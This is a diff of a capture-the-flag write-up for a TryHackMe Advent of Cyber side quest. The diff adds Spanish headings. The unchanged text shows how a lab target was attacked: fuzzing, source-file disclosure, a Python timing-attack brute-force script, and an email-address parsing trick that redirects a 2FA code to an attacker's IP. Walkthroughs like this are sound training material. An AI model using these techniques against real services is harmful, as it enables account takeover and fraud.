@@ -11,7 +11,7 @@ Finally, to obtain the **third flag**, we identified a flaw in the email address
 
  Tryhackme Room Link (https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK) 
 
-## Finding the Key
+## Encontrando la Llave / Finding the Key
 
 In the **Advent of Cyber Day 21** room, we are given a [ZIP file](https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip) and its password.
 
@@ -103,26 +103,22 @@ $ grep -o "'[A-Za-z0-9+/=]\{20,\}'" stage2.ps1 | tr -d "'\n'" | base64 -d | xort
 
 Opening the resulting PNG image reveals the **key**, allowing us to move on to the **side quest**.
 
-### key_image 
+key_image
 ![key_image](./img/key_image.webp)
 
-# password
+# Advent 2025\SideQuest\Sidequest\Sidequest4\Tutorial\tutorial jaxafed [N/A]
 `throne123*`
 
-
-## Side Quest
+## Misión Lateral / Side Quest
 
 We start the side quest by visiting the web server on port `21337` and entering the key we discovered to disable the firewall.
 
-
-
-
-### web_21337_unlock 
+web_21337_unlock
 ![web_21337_unlock](./img/web_21337_unlock.webp)
 
 URL from machine: 10.66.153.21 
 
-### Initial Enumeration
+### Enumeración Inicial / Initial Enumeration
 
 Running an `nmap` scan to discover open ports:
 
@@ -161,10 +157,10 @@ There are three open ports:
 
 Checking the HTTPS server on port `8443`, we see an **emulated mobile phone** interface with the `Hopflix` and `Hopsec Bank` applications. However, both applications require credentials, which we do not have at this stage.
 
-### web_8443_index.webp 
+web_8443_index.webp
 ![web_8443_index](./img/web_8443_index.webp)
 
-### First Flag
+### Primera Bandera / First Flag
 
 We do not get much from the phone interface, apart from seeing it connect to several API endpoints. Instead, by fuzzing the application with `quickhits.txt`, we can discover the `nginx.conf` file.
 
@@ -174,7 +170,6 @@ $ ffuf -u 'https://10.66.153.21:8443/FUZZ' -w /usr/share/seclists/Discovery/Web-
 nginx.conf              [Status: 200, Size: 890, Words: 226, Lines: 32, Duration: 186ms]
 ```
  
-
 
 We are able to read the **Nginx configuration** directly.
 
@@ -226,7 +221,7 @@ We can abuse this behavior to read files from the web application directory, inc
 ### Web 8443 Main Py
 ![Web 8443 Main Py](./img/web_8443_main_py.webp) 
 
-### Second Flag
+### Segunda Bandera / Second Flag
 
 The leaked source code also references two database files: `hopflix-874297.db` and `hopsecbank-12312497.db`. Attempting to retrieve them shows that `hopsecbank-12312497.db` does not exist in the web root, but `hopflix-874297.db` does.
 
@@ -313,8 +308,7 @@ for ch in pwd:
 
 This allows us to perform a **timing attack**, brute-forcing the password **character by character** by measuring response times. The following script tests each possible character and selects the one with the longest average response time.
 
-
-### file: brute.py
+file: brute.py
 ```py
 import requests
 import time
@@ -322,10 +316,10 @@ import statistics
 import string
 import urllib3
 
-# Disable SSL warnings for self-signed certificates
+## Disable SSL warnings for self-signed certificates
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Configuration
+## Configuration
 TARGET_URL = "https://10.66.153.21:8443/api/check-credentials"
 EMAIL = "sbreachblocker@easterbunnies.thm"
 PASSWORD_LENGTH = 12  # Based on hash length: 480/40 = 12 characters
@@ -461,7 +455,6 @@ if __name__ == "__main__":
 > It is highly recommended to run this script from the **TryHackMe's AttackBox**. Due to the sensitivity of timing-based attacks, running it over a VPN connection is likely to produce false positives. Increasing the sample size may help, but it also significantly increases execution time.
  
 
-
 Running the script allows us to recover the **Hopflix password**.
 
 ```console
@@ -526,10 +519,10 @@ Testing discovered password...
 
 Using the discovered credentials `sbreachblocker@easterbunnies.thm:malharerocks`, we log in to the application and capture the **second flag**.
 
-### web_8443_second_flag 
+web_8443_second_flag
 ![web_8443_second_flag](./img/web_8443_second_flag.webp)
 
-### Third Flag
+### Tercera Bandera / Third Flag
 
 We can also try using the same credentials we obtained for **Hopflix** to log in to the **Hopsec Bank** application.
 
@@ -538,12 +531,12 @@ We can also try using the same credentials we obtained for **Hopflix** to log in
 
 We are able to log in successfully; however, after authentication, the application asks us to choose an email address to which a **2FA OTP code** will be sent.
 
-### web_8443_bank2 
+web_8443_bank2
 ![web_8443_bank2](./img/web_8443_bank2.webp) 
 
 After selecting any of the listed email addresses, the application prompts us to enter the **2FA OTP** that was supposedly sent to that email, which we do not have access to.
 
-### web_8443_bank3 
+web_8443_bank3
 ![web_8443_bank3](./img/web_8443_bank3.webp) 
 
 > At this point, it is technically possible to brute-force the **6-digit OTP** if you want to try.
@@ -638,7 +631,7 @@ jxf@[192.168.161.135](@easterbunnies.thm
 
 This causes the OTP email to be delivered to `jxf@[192.168.161.135]`, while still passing the application’s validation logic.
 
-### web_8443_bank4
+web_8443_bank4
 ![web_8443_bank4](./img/web_8443_bank4.webp) 
 
 Forwarding the modified request confirms that the bypass works, and we successfully receive the OTP code.
@@ -662,16 +655,14 @@ X-Peer: ('10.66.153.21', 54620)
 
 We can now enter the captured OTP code to complete the login process for **Hopsec Bank**.
 
-### web_8443_bank5 
+web_8443_bank5
 ![web_8443_bank5](./img/web_8443_bank5.webp) 
 
 This works as expected, and we are successfully logged in.
 
-### web_8443_bank6 
+web_8443_bank6
 ![web_8443_bank6](./img/web_8443_bank6.webp) 
 
-
 Finally, by clicking the **Release Charity Funds** button, we capture the **third flag** and complete the room.
-
 
 EOF
